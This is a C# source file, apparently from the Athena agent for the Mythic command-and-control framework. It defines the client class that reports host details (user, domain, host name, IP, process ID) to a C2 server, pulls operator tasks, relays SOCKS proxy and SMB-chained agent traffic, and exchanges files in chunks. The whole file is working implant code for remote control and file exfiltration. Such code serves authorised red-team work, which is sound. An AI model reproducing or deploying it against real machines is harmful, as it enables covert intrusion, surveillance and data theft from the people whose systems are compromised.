using Athena.Config;
using Athena.Utilities;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Threading.Tasks;
using Athena.Models.Mythic.Checkin;
using Athena.Models.Mythic.Tasks;
using Athena.Models.Mythic.Response;
using Athena.Models.Athena.Commands;
using Newtonsoft.Json.Linq;

namespace Athena
{
    public class MythicClient
    {
        public MythicConfig MythicConfig { get; set; }
        public MythicClient()
        {
            this.MythicConfig = new MythicConfig();
        }
        public CheckinResponse CheckIn()
        {
            Checkin ct = new Checkin()
            {
                action = "checkin",
                ip = Dns.GetHostEntry(Dns.GetHostName()).AddressList[0].ToString(),
                os = Environment.OSVersion.ToString(),
                user = Environment.UserName,
                host = Dns.GetHostName(),
                pid = Process.GetCurrentProcess().Id.ToString(),
                uuid = this.MythicConfig.uuid,
                architecture = Misc.GetArch(),
                domain = Environment.UserDomainName,
            };
            var responseString = this.MythicConfig.currentConfig.Send(ct).Result;
            try
            {
                CheckinResponse cs = JsonConvert.DeserializeObject<CheckinResponse>(responseString);
                if (cs is null)
                {
                    cs = new CheckinResponse()
                    {
                        status = "failed",

                    };
                }
                return cs;
            }
            catch
            {
                return new CheckinResponse();
            }
        }
        public List<MythicTask> GetTasks(List<DelegateMessage> delegateMessages)
        {

            GetTasking gt = new GetTasking()
            {
                action = "get_tasking",
                tasking_size = -1,
                delegates = delegateMessages,
                //socks = Globals.socksHandler.getMessages() ?? new List<SocksMessage>(),
                socks = new List<SocksMessage>()
            };

            try
            {
                var responseString = this.MythicConfig.currentConfig.Send(gt).Result;

                if (String.IsNullOrEmpty(responseString))
                {
                    return null;
                }
                GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(responseString);
                
                if (gtr is null)
                {
                    return null;
                }

                //Check if we have any socks messages to forward
                if (gtr.socks is not null && gtr.socks.Count > 0)
                {
                    foreach (var s in gtr.socks)
                    {
                        Globals.socksHandler.AddToQueue(s);
                    }
                }

                //Check if we have any delegate messages to forward
                if (gtr.delegates is not null && gtr.delegates.Count > 0)
                {
                    foreach (var del in gtr.delegates)
                    {
                        Globals.mc.MythicConfig.smbForwarder.ForwardDelegateMessage(del);
                    }
                }

                //Return the tasks
                return gtr.tasks;
            }
            catch
            {
                return null;
            }
        }
        public bool SendResponse(List<MythicJob> jobs, List<DelegateMessage> delegateMessages, List<SocksMessage> socksMessages)
        {
            List<ResponseResult> responseResults = GetResponses(jobs);

            PostResponseResponse prr = new PostResponseResponse()
            {
                action = "post_response",
                responses = responseResults,
                socks = socksMessages,
                delegates = delegateMessages,
            };

            //Things that will likely break in the event this function fails at the wrong time
            //Socks communications - new connections will still be accepted
            //SMB Comms - Will likely cause the death of the SMBClient
            //Uploads/Downloads(?) - these can be restarted easily
            //Tasks will likely be fine
            try
            {
                var responseString = this.MythicConfig.currentConfig.Send(prr).Result;

                JObject responseObject = JObject.Parse(responseString);

                if (string.IsNullOrEmpty(responseString))
                {
                    return false;
                }
                if (responseString.Contains("chunk_data"))
                {
                    return HandleChunkResponse(responseString);
                }
                else
                {
                    return HandleStandardResposne(responseString);
                }
            }
            catch
            {
                return false;
            }
        }
        private bool HandleChunkResponse(string responseString)
        {
            PostUploadResponseResponse cs = JsonConvert.DeserializeObject<PostUploadResponseResponse>(responseString);

            if (cs is null)
            {
                return false;
            }
            else
            {
                //Pass up delegates
                if (cs.delegates is not null && cs.delegates.Count > 0)
                {
                    foreach (var del in cs.delegates)
                    {
                        Globals.mc.MythicConfig.smbForwarder.ForwardDelegateMessage(del);
                    }
                }
                //Pass up socks messages
                if (cs.socks is not null && cs.socks.Count > 0)
                {
                    foreach (var s in cs.socks)
                    {
                        Globals.socksHandler.AddToQueue(s);
                    }
                }

                //Handle Upload/Download Responses
                if (cs.responses is not null)
                {
                    //Handle Upload/Download Responses
                    foreach (var response in cs.responses)
                    {
                        //Spin off new thread to upload new chunks
                        if (!String.IsNullOrEmpty(response.chunk_data))
                        {
                            //Spin up new task to handle uploads/downloads
                            Task.Run(() =>
                            {
                                try
                                {
                                    //Upload
                                    if (Globals.uploadJobs.ContainsKey(response.task_id))
                                    {
                                        //Get upload and mythic job
                                        MythicUploadJob uj = Globals.uploadJobs[response.task_id];
                                        MythicJob job = Globals.jobs[response.task_id];

                                        uj.uploadChunk(response.chunk_num, Misc.Base64DecodeToByteArray(response.chunk_data), job);
                                    }

                                    //Download
                                    else if (Globals.downloadJobs.ContainsKey(response.task_id))
                                    {
                                        if (!String.IsNullOrEmpty(response.file_id))
                                        {
                                            MythicDownloadJob j = Globals.downloadJobs[response.task_id];
                                            if (string.IsNullOrEmpty(j.file_id))
                                            {
                                                j.file_id = response.file_id;
                                                j.hasoutput = false;
                                            }
                                        }
                                    }
                                }
                                catch (Exception e)
                                {
                                    MythicJob job = Globals.jobs[response.task_id];
                                    job.errored = true;
                                    job.complete = true;
                                    job.taskresult = e.Message;
                                    job.hasoutput = true;
                                }
                            });

                        }
                    }
                    return true;
                }
                return false;
            }
        }
        private bool HandleStandardResposne(string responseString)
        {
            PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(responseString);
            if(cs is null)
            {
                return false;
            }

            //Check for socks messages to pass on
            if (cs.socks is not null)
            {
                foreach (var s in cs.socks)
                {
                    Globals.socksHandler.AddToQueue(s);
                }
            }

            //Check for delegates to pass on
            if (cs.delegates is not null)
            {
                foreach (var del in cs.delegates)
                {
                    Task.Run(() => { Globals.mc.MythicConfig.smbForwarder.ForwardDelegateMessage(del); });    
                }
            }

            //Todo Change this to make use of an object instead of trying to mess with threads. (Example how SOCKS is handled)
            //Check for file chunks to pass on
            if (cs.responses is not null)
            {
                foreach (var response in cs.responses)
                {
                    if (!String.IsNullOrEmpty(response.file_id))
                    {
                        MythicDownloadJob j = Globals.downloadJobs[response.task_id];
                        if (string.IsNullOrEmpty(j.file_id))
                        {
                            j.file_id = response.file_id;
                            j.hasoutput = false;
                        }
                    }
                }
            }
            return true;
        }
        private List<ResponseResult> GetResponses(List<MythicJob> jobs)
        {
            List<ResponseResult> lrr = new List<ResponseResult>();
            foreach (var job in jobs)
            {
                try
                {
                    switch (job.task.command)
                    {
                        case "upload":
                            MythicUploadJob uj = Globals.uploadJobs[job.task.id];

                            if (!uj.uploadStarted)
                            {
                                UploadResponse ur = new UploadResponse()
                                {
                                    task_id = uj.task.id,
                                    upload = new UploadResponseData()
                                    {
                                        chunk_size = 512000,
                                        chunk_num = -1,
                                        file_id = uj.file_id,
                                        full_path = uj.path
                                    }
                                };
                                lrr.Add(ur);
                            }
                            else if (uj.complete)
                            {
                                UploadResponse ur = new UploadResponse()
                                {
                                    task_id = uj.task.id,
                                    upload = new UploadResponseData()
                                    {
                                        chunk_size = 512000,
                                        chunk_num = uj.chunk_num,
                                        file_id = uj.file_id,
                                        full_path = uj.path
                                    },
                                    completed = "true"

                                };
                                lrr.Add(ur);
                            }
                            else
                            {
                                UploadResponse ur = new UploadResponse()
                                {
                                    task_id = uj.task.id,
                                    upload = new UploadResponseData()
                                    {
                                        chunk_size = 512000,
                                        chunk_num = uj.chunk_num,
                                        file_id = uj.file_id,
                                        full_path = uj.path
                                    },
                                };
                                uj.uploadStarted = true;
                                lrr.Add(ur);
                            }

                            break;
                        case "download":
                            MythicDownloadJob j = Globals.downloadJobs[job.task.id];

                            //Initiate Download
                            if (!j.downloadStarted)
                            {
                                DownloadResponse dr = new DownloadResponse()
                                {
                                    task_id = job.task.id,
                                    completed = "",
                                    user_output = "",
                                    status = "",
                                    total_chunks = j.total_chunks,
                                    full_path = j.path,
                                    chunk_num = 0,
                                    chunk_data = "",
                                    file_id = "",
                                };
                                lrr.Add(dr);
                                j.downloadStarted = true;
                            }
                            else
                            {
                                //We're on the final chunk
                                if (j.chunk_num == j.total_chunks)
                                {
                                    DownloadResponse dr = new DownloadResponse()
                                    {
                                        task_id = job.task.id,
                                        user_output = "",
                                        status = "",
                                        full_path = "",
                                        chunk_num = j.chunk_num,
                                        chunk_data = job.taskresult,
                                        file_id = j.file_id,
                                        completed = "true",
                                        total_chunks = -1

                                    };
                                    lrr.Add(dr);
                                }
                                //Upload next chunk
                                else
                                {
                                    DownloadResponse dr = new DownloadResponse()
                                    {
                                        task_id = job.task.id,
                                        user_output = "",
                                        status = "",
                                        total_chunks = -1,
                                        full_path = "",
                                        chunk_num = j.chunk_num,
                                        chunk_data = job.taskresult,
                                        file_id = j.file_id
                                    };
                                    lrr.Add(dr);
                                }
                            }
                            break;
                        default:
                            if (job.errored)
                            {
                                ResponseResult rr = new ResponseResult()
                                {
                                    task_id = job.task.id,
                                    status = "error",
                                    completed = "true",
                                    user_output = job.taskresult
                                };
                                lrr.Add(rr);
                            }
                            else if (job.complete)
                            {
                                if (job.task.command == "load")
                                {
                                    LoadCommand lc = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
                                    CommandsResponse cr = new CommandsResponse()
                                    {
                                        action = "add",
                                        cmd = lc.name,
                                    };
                                    LoadCommandResponseResult rr = new LoadCommandResponseResult()
                                    {
                                        task_id = job.task.id,
                                        completed = "true",
                                        user_output = job.taskresult,
                                        commands = new List<CommandsResponse>() { cr }
                                    };
                                    lrr.Add(rr);
                                }
                                else
                                {
                                    ResponseResult rr = new ResponseResult()
                                    {
                                        task_id = job.task.id,
                                        completed = "true",
                                        user_output = job.taskresult,
                                        status = "complete"
                                    };
                                    lrr.Add(rr);
                                }
                            }
                            else
                            {
                                ResponseResult rr = new ResponseResult()
                                {
                                    task_id = job.task.id,
                                    user_output = job.taskresult,
                                    status = "processed"
                                };
                                lrr.Add(rr);
                            }
                            break;
                    };
                }
                catch (Exception e)
                {
                    Misc.WriteError(e.Message);
                }
            }
            return lrr;
        }
    }
}
